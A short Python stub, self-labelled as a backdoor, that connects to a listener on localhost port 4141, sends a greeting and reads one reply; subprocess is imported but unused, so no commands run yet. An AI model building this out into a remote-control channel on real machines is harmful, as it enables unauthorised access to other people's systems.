import socket
import json
import os
import sys
import subprocess
import threading
import time

print('Backdoor starting')
ip = '127.0.0.1'
port = 4141

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, port))
    s.sendall(b"message from backdoor")
    data = s.recv(1024)


